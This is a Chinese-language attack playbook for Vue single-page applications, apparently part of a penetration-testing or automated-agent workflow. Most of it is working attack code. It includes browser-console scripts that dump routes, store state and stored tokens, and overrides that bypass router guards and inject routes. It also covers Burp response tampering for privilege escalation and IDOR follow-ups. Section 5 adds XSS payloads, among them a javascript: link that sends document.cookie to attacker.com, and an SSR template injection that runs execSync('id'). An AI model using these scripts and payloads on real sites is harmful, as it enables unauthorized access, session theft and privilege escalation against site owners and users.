# Vue SPA 特化攻击面 — 绕过与信息提取

> 针对 Vue 2/3 + Vue Router + Pinia/Vuex 的 SPA 应用专用攻击方法。
> 核心原理: 前端路由守卫 ≠ 后端鉴权。Vue 的运行时对象暴露了大量可利用信息。

---

## 1. Vue Router 路由穷举 + Auth Guard 绕过 ★★★

> 最高价值攻击面。Vue Router 前端守卫 `beforeEach` 经常只检查 `store.getters.token`，
> 后端 API 没有对应的角色鉴权。绕过前端守卫后，隐藏路由对应的懒加载 JS chunk
> 会暴露完整的管理 API 表面。

### 1.1 从 Vue 运行时提取全量路由

```javascript
// === 方法1: 通过 __vue_app__ 提取 (Vue 3) ===
const app = document.querySelector('#app').__vue_app__;
const router = app.config.globalProperties.$router;
const routes = router.getRoutes();
routes.forEach(r => {
  console.log({
    path: r.path,
    name: r.name,
    meta: r.meta,           // 含 roles/permissions/requiresAuth
    component: r.components?.default?.name || r.components?.default?.__name,
    children: r.children?.map(c => c.path)
  });
});

// === 方法2: 通过 Vue.prototype 提取 (Vue 2) ===
const router = document.querySelector('#app').__vue__.$router;
// 同上

// === 方法3: 通过 window.__VUE_DEVTOOLS_GLOBAL_HOOK__ ===
const hook = window.__VUE_DEVTOOLS_GLOBAL_HOOK__;
hook.apps.forEach(app => {
  const router = app._instance?.proxy?.$router;
  if (router) {
    router.getRoutes().forEach(r => console.log(r.path, r.meta));
  }
});
```

### 1.2 Auth Guard 解除方法

```javascript
// 方法A: 重写 beforeEach — 全局解除所有守卫
router.beforeEach = (to, from, next) => next();

// 方法B: 解除单个路由的 beforeEnter
routes.forEach(r => {
  if (r.beforeEnter) delete r.beforeEnter;
  r.children?.forEach(c => delete c.beforeEnter);
});

// 方法C: 伪造 meta 满足守卫条件
// 原守卫: if (to.meta.requiresAuth && !token) next('/login')
// 绕过: 所有路由注入 requiresAuth: false
router.getRoutes().forEach(r => {
  if (r.meta) r.meta.requiresAuth = false;
});
router.push('/admin/dashboard');

// 方法D: 使用 router.replace 跳过导航守卫检查
// 某些版本的 Vue Router 对 replace 的守卫检查不严格
router.replace('/admin/users').catch(() => {});
```

### 1.3 强制触发懒加载

```javascript
// Vue Router 路由使用动态 import 实现代码分割
// 只有实际导航到路由时才会下载对应 chunk
// 绕过守卫后，遍历所有路由强制触发懒加载

const routes = router.getRoutes();
let i = 0;
const interval = setInterval(() => {
  if (i >= routes.length) { clearInterval(interval); return; }
  router.push(routes[i].path).catch(() => {});
  i++;
}, 500); // 500ms 间隔，观察 Network 面板中新增的 JS chunk

// 观察: chrome-devtools_list_network_requests filter:resourceType=script
// 每跳转一个新路由，检查是否出现新的 .js 文件
// → 有 → 下载到 js/ 目录 → 进入标准 JS 深度分析流程
```

---

## 2. `__vue_app__` 全局对象信息提取 ★★

```
Vue 3 运行时全局暴露:

window.__VUE__                    → Vue 版本字符串
document.querySelector('#app').__vue_app__  → 应用实例
  .config.globalProperties        → 全局注入的方法/变量
  ._instance.proxy                → 根组件实例
  ._instance.appContext           → 应用上下文
  ._instance.setupState           → <script setup> 中的响应式状态
  ._context.provides              → provide/inject 数据

Vue 2 运行时全局暴露:

window.__VUE__                    → Vue 版本
window.__VUE_DEVTOOLS_GLOBAL_HOOK__ → DevTools 钩子(生产环境可能未移除)
document.querySelector('#app').__vue__ → Vue 实例
  .$store                         → Vuex Store
  .$router                        → Vue Router
  .$route                         → 当前路由
```

**自动化提取脚本**:
```javascript
// 注入: chrome-devtools_evaluate_script
(function() {
  const results = { vue: {}, router: {}, store: {} };

  // Vue 3 路径
  const appEl = document.querySelector('#app') || document.querySelector('[data-v-]');
  if (appEl && appEl.__vue_app__) {
    const app = appEl.__vue_app__;
    results.vue.version = app.version;
    results.vue.globalProps = Object.keys(app.config.globalProperties || {});

    // 路由
    const router = app.config.globalProperties.$router;
    if (router) {
      results.router.mode = router.options?.history?.base || 'hash';
      results.router.routes = router.getRoutes().map(r => ({
        path: r.path, name: r.name,
        meta: r.meta,
        hasChildren: (r.children || []).length > 0
      }));
    }

    // Store (Pinia)
    const pinia = app.config.globalProperties.$pinia;
    if (pinia && pinia._s) {
      results.store.type = 'pinia';
      results.store.stores = [];
      pinia._s.forEach((store, id) => {
        results.store.stores.push({ id, state: store.$state });
      });
    }
  }

  // Vue 2 路径
  if (appEl && appEl.__vue__) {
    const vm = appEl.__vue__;
    results.vue.version = '2.x';
    if (vm.$store) {
      results.store.type = 'vuex';
      results.store.state = vm.$store.state;
      results.store.getters = Object.keys(vm.$store.getters);
    }
  }

  // 全局泄露: localStorage/sessionStorage 中的 Token 和用户信息
  results.storage = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (/token|auth|user|session|jwt/i.test(key)) {
      results.storage[key] = localStorage.getItem(key);
    }
  }
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    if (/token|auth|user|session|jwt/i.test(key)) {
      results.storage[key] = sessionStorage.getItem(key);
    }
  }

  return JSON.stringify(results, null, 2);
})();
```

---

## 3. Pinia / Vuex Store 越权 ★★★

> Store 中常缓存管理菜单配置、角色权限表、API端点列表、用户完整信息等。
> 这些数据是前端路由守卫的判断依据，提取它们 = 知道所有隐藏的攻击面。

### 3.1 Pinia Store 遍历 (Vue 3)

```javascript
const pinia = app.config.globalProperties.$pinia;

// 遍历所有 store
pinia._s.forEach((store, id) => {
  console.group(`Store: ${id}`);
  console.log('State:', JSON.parse(JSON.stringify(store.$state)));
  console.log('Getters:', store.$id ? Object.keys(store) : []);
  console.groupEnd();
});

// 高价值 store 名:
// "user" / "permission" / "app" / "settings" / "auth" / "menu"
// 例: permission store 常含添加路由的函数和角色白名单
```

### 3.2 Vuex Store 遍历 (Vue 2)

```javascript
const store = document.querySelector('#app').__vue__.$store;

// 全量 state
console.log('Vuex State:', store.state);

// 全量 getters
console.log('Vuex Getters:', Object.keys(store._wrappedGetters || {}));

// 全量 mutations/actions
console.log('Vuex Mutations:', Object.keys(store._mutations || {}));
console.log('Vuex Actions:', Object.keys(store._actions || {}));

// 关键泄露字段:
//  □ store.state.user.token → JWT Token
//  □ store.state.user.info → 用户信息 (phone/email/role)
//  □ store.state.user.permissions → 角色权限表 (含隐藏路由)
//  □ store.state.permission.routes → 完整菜单树 (含管理路由)
//  □ store.state.app.asyncRoutes → 动态添加的权限路由
```

### 3.3 利用场景

```
Store 泄露 → 攻击利用:

1. permissions 列表 → 直接 curl 后端 API
   Store 中的 permissions: ["user:list", "user:export", "admin:config"]
   → 即使前端不显示这些菜单，后端接口可能存在
   → 用当前 token 逐个请求 /api/admin/config 等

2. menuRoutes → 构建完整路由表
   → 识别隐藏的 /admin/ /manage/ /system/ 路径
   → Sub-Path SPA 探测

3. user.role + permissions → 判断越权潜力
   → 普通用户看到 admin 权限 → 垂直越权
```

---

## 4. Component 树遍历提取隐藏功能 ★

```javascript
// 递归遍历整个组件树，发现管理组件和隐藏功能
function walkVNode(vnode, depth = 0) {
  if (!vnode) return;
  const comp = vnode.component;
  if (comp) {
    const name = comp.type?.name || comp.type?.__name || 'Anonymous';
    const props = comp.props ? Object.keys(comp.props) : [];
    const exposed = comp.exposed ? Object.keys(comp.exposed) : [];

    console.log(
      '  '.repeat(depth) + `[${name}]`,
      props.length ? `props: [${props.join(',')}]` : '',
      exposed.length ? `exposed: [${exposed.join(',')}]` : ''
    );

    // 标记高价值组件
    const highValue = /admin|manage|config|export|system|console|dashboard|user/i;
    if (highValue.test(name)) {
      console.warn(`⚠️  ADMIN COMPONENT: ${name}`, {
        props: comp.props,
        exposed: comp.exposed,
        setupState: comp.setupState ? Object.keys(comp.setupState) : []
      });
    }
  }

  // 递归子节点
  if (vnode.children && Array.isArray(vnode.children)) {
    vnode.children.forEach(c => walkVNode(c, depth + 1));
  }
  if (vnode.component?.subTree) {
    walkVNode(vnode.component.subTree, depth + 1);
  }
  if (vnode.dynamicChildren) {
    vnode.dynamicChildren.forEach(c => walkVNode(c, depth + 1));
  }
}

// 执行
const app = document.querySelector('#app').__vue_app__;
walkVNode(app._instance.subTree);
```

---

## 5. Vue 特有 XSS 面 ★

### 5.1 v-html 用户输入渲染

```html
<!-- 原代码: -->
<div v-html="userBio"></div>

<!-- 检测信号: JS 中有 .innerHTML 赋值、v-html 指令编译后的 _v() 调用 -->
```

```javascript
// 注入测试:
userBio = '<s>XSS</s>';  // 预检: 是否渲染为删除线?
// Step 2:
userBio = '<img src=x onerror="console.log(\'xss\')">';
// → F12 Console 检查日志
```

### 5.2 v-bind:href / :href 注入

```html
<!-- 原代码: -->
<a :href="userProvidedLink">用户链接</a>
```

```javascript
// 攻击注入:
userProvidedLink = 'javascript:fetch("https://attacker.com/?c="+document.cookie)';

// 检测: 点击链接是否执行了 JS
```

### 5.3 动态组件注入

```html
<!-- 原代码: -->
<component :is="dynamicComponent" />
```

```javascript
// 如果 dynamicComponent 可能被用户控制:
// → 可能存在任意组件加载
// 检测: JS 中搜索 component :is 或 resolveComponent
```

### 5.4 Vue SSR 模板注入 (SSTI 类型)

```
Vue 服务端渲染使用与客户端相同的模板语法，如果用户输入直接拼入模板:

{{ constructor.constructor('return this')() }}
{{ _c.constructor('return this')().process }}
{{ $root.constructor.constructor('return this')().mainModule.require('child_process').execSync('id') }}
```

---

## 6. SPA 懒加载 Chunk 发现 ★★

> Vue Router 的 `component: () => import('@/views/admin/index.vue')` 为每个懒加载路由生成独立 chunk。
> 但 build 产物中 chunk 文件名可能是 hash，需要从路由定义推断。

```bash
# 方法1: 从 vendor/app chunk 中提取 webpackChunkName 注释
grep -oP 'webpackChunkName:\s*"([^"]+)"' downloaded/{target}/js/*.js | sort -u

# 方法2: 提取所有路径定义 (Vue Router route paths)
grep -oP 'path:\s*"([^"]{2,})"' downloaded/{target}/js/*.js | sort -u

# 方法3: 提取懒加载 import 路径
grep -oP "import\s*\(\s*['\"]([^'\"]+)['\"]\s*\)" downloaded/{target}/js/*.js

# 方法4: Vite/Rollup 产物中的动态 import
grep -oP "import\(['\"]([^'\"]+)['\"]\)" downloaded/{target}/js/*.js
```

**高价值 chunk 特征**:
```
□ 文件名含 admin/manage/system/dashboard/console
□ 文件大小显著大于普通页面 chunk (>50KB)
□ 包含接口路径: /api/admin/ /api/manage/ /api/export/
□ 包含表单组件 (el-form / a-form / t-form)
□ 包含权限检查逻辑 (hasPermission / checkRole)
```

---

## 7. Vue DevTools 泄露检测

```
生产环境残留的 DevTools 访问:

1. window.__VUE_DEVTOOLS_GLOBAL_HOOK__ → DevTools 钩子未移除
   → 可从中枚举所有 Vue app 实例

2. Vue.config.devtools = true → DevTools 在生产环境启用
   → 任何人都可以通过浏览器扩展查看:
     · 组件树和组件 data
     · Vuex/Pinia Store 全量状态
     · 路由表和当前路由
     · 事件历史

3. __VUE_DEVTOOLS_GLOBAL_HOOK__.Vue → 泄露 Vue 版本号

检测:
  typeof window.__VUE_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined'
  → 如果为 true, 生产环境未清理 DevTools 钩子 → 信息泄露
```

---

## 8. Vue 版本差异速查

| 特性 | Vue 2 | Vue 3 |
|------|-------|-------|
| 全局访问 | `#app.__vue__` | `#app.__vue_app__` |
| Store | `.$store` (Vuex) | `.$pinia` (Pinia) 或 `.$store` |
| 响应式系统 | `Object.defineProperty` | `Proxy` |
| Composition API | 需要 `@vue/composition-api` | 内置 |
| `<script setup>` | 不支持 | 编译后暴露变量名 |
| 全局 Vue 构造器 | `window.Vue` | `window.__VUE__` |
| DevTools Hook | `window.__VUE_DEVTOOLS_GLOBAL_HOOK__` | 同 (兼容) |

**Vue 3 `<script setup>` 的特殊信息泄露**:
```javascript
// Vue 3 的 <script setup> 编译后:
// const apiBase = 'https://admin-api.internal.com'
// → 暴露在:
app._instance.setupState.apiBase  // 'https://admin-api.internal.com'

// 可枚举 setupState 中的所有内部变量
Object.keys(app._instance.setupState).forEach(key => {
  console.log(key, '=', app._instance.setupState[key]);
});
// → 可能暴露: apiBaseUrl, internalEndpoints, secretKeys, featureFlags
```

---

## 9. 集成到标准工作流

### Phase 1 雪瞳注入补充 (追加到 snow_eyes_inject.js)

```
在原有注入基础上追加:
  1. → 提取 Vue Router 全量路由表 + meta
  2. → 枚举 Pinia/Vuex Store 状态
  3. → 枚举 setupState 内部变量 (Vue 3)
  4. → 遍历 localStorage/sessionStorage 中的 auth 相关 key
  5. → 检测 __VUE_DEVTOOLS_GLOBAL_HOOK__ 是否暴露 (生产环境残留)
  6. → 读取 Vue 版本 + 全局组件的 mixin 配置
```

### Phase 1 Sub-Path SPA 探测补充

```
Vue SPA 的路由信息已在运行时提取，替代了基于目录爆破的 Sub-Path 探测。
但仍需对以下做最终确认:
  □ 提取到的每个路由 path → curl 直接请求 (检测 SSR fallback 或静态部署)
  □ 独立 Vue app 挂载点: document.querySelectorAll('[data-v-app]')
    如果一个域名下挂载了多个 Vue app → 每个 app 有独立的 router + store
```

### Phase 2 值池联动补充

```
从 Store 提取的值直接注入值池:
  □ user.permissions[] → 每个 permission 字符串可能对应 API 路径
  □ user.info → userId, phone, email, orgId → IDOR 测试
  □ menuRoutes → 每个 route 的 apiBase 或 dataUrl
  □ app.config → apiBaseUrl, uploadUrl, wsUrl
```

---

## 10. Quick Reference

```bash
# 浏览器 Console 一键提取 Vue SPA 攻击面
(function(){
  const r = {vue:'', router:[], store:[], storage:{}, components:[], setupState:[]};
  const app = (document.querySelector('#app')||document.querySelector('[data-v-app]')||{}).__vue_app__;
  if(!app){console.log('No Vue 3 app found');return;}
  r.vue = app.version;
  const router = app.config?.globalProperties?.$router;
  if(router) r.router = router.getRoutes().map(x=>({path:x.path,name:x.name,meta:x.meta}));
  const pinia = app.config?.globalProperties?.$pinia;
  if(pinia) pinia._s.forEach((s,id)=>r.store.push({id,state:s.$state}));
  r.setupState = Object.entries(app._instance?.setupState||{}).map(([k,v])=>[k,typeof v]);
  for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(/token|auth|user|jwt|session/i.test(k))r.storage[k]='[found]';}
  console.log(JSON.stringify(r,null,2));
  return r;
})();
```

---

## 11. 前端鉴权绕过 — 响应包修改法 ★★★

> 后端没鉴权或鉴权不全，前端自己做了层校验。
> 你只需要在 Burp 中改响应包，让前端展示本不该看到的数据。

### 场景判断树

```
发现 API 返回数据但页面不展示/提示无权限?

├── 场景A: 状态码 401→200
│   └── Backend 401 → Burp改200 → 数据出现 ✅

├── 场景B: JSON 字段 {"success":false}→{"success":true}
│   └── 改 code:401→200 同时改 success:false→true ✅

├── 场景C: JS if(res.ok) 判断 → Burp保200即可绕过 ✅

├── 场景D: localStorage 注入 Token
│   └── 在当前页面注入 Token→刷新→后端返回正常数据 ✅

├── 场景E: 前端路由鉴权 → 直接 curl API(后端可能无鉴权) ✅

├── 场景F: ★ 权限菜单响应替换法(最聪明)
│   ├── 管理员账号→抓取权限菜单完整响应
│   ├── 替换给子账号的权限菜单接口
│   └── 子账号刷新→界面出现所有管理员功能点 ✅

├── 场景G: 浏览器回退绕过
│   └── 登录后自动跳转→回退按钮→回到跳转前高权限页 ✅

└── 场景H: 按钮灰色/disabled → 直接 URL 访问绕过 UI ✅
```

### 辅助字段速查

```
改了以下字段可能直接提权:
super_user_force→super_user_true  |  isAdmin:false→true
role:"user"→"admin"               |  level:0→1
isActive:0→1  isShow:0→1         |  status:"inactive"→"active"
```

---

## 12. 前端鉴权绕过 — 路由注入法 ★★★

> 路由守卫只在"导航时"拦截。已注册路由+router.addRoute() 可绕过。

### JS 源码搜索清单

```
1. 搜路由定义:  routes:[  path:'/'  component:()=>import
2. 搜守卫逻辑:  beforeEach  beforeEnter  meta.requiresAuth  meta.role
3. 搜动态路由:  addRoute  addRoutes  convertMenuToRoute  filterRoutes
4. 搜权限菜单:  getMenu  getRouters  getPermission  menuList
5. 同源推测:    已知 /api/crowd/count → 猜 /api/crowd/save /api/crowd/delete
6. 空数据≠没价值: 返回 [] 但暴露字段名→下一步猜其他接口
```

### 4 个路由注入场景

```
场景I: 静态路由直接访问
  → JS中搜 path:'/' 找到静态路由→浏览器直接访问(可能无需登录)

场景J: beforeEach 守卫逻辑漏洞
  → 只查token不查role? return写错? 数组守卫只执行第一个?
  → 测试: localStorage.setItem('token','任意')→刷新→看是否放行

场景K: ★ 控制台 router.addRoute() 注入
  const router = document.querySelector('#app').__vue_app__
    .config.globalProperties.$router
  router.addRoute({path:'/admin/users',name:'admin-users',
    component:()=>import('@/views/admin/UserManage.vue')})
  router.push('/admin/users')
  → 注册成功=绕过守卫 ✅

场景L: 路径前缀推测 → /worker/→猜 /admin/ 也存在
```

### 典型 beforeEach 漏洞

```
1. !token→next('/login') else next()  ← 所有已登录用户可访所有路由
2. return true / return undefined  ← 没阻止,等价放行
3. addRoute后 next({...to,replace:true})  ← 守卫已过
4. children路由无独立守卫  ← /admin/users 无保护
```

---

## 13. 关键整合: Vue 攻击面数据流

```
雪瞳注入(v1.1)提取:
  vue_routes + vue_store + vue_setup_state + devtools_exposed
     ↓
burpsuite/curl 执行:
  §11 响应包修改(场景A-H) + §12 路由注入(场景I-L)
     ↓
新 chunk 落盘 → JS 深度分析 → _endpoint_params.json
     ↓
提取的管理 API → 值池联动注入 → IDOR/垂直越权
```

---

*End of vue-spa-attacks.md*
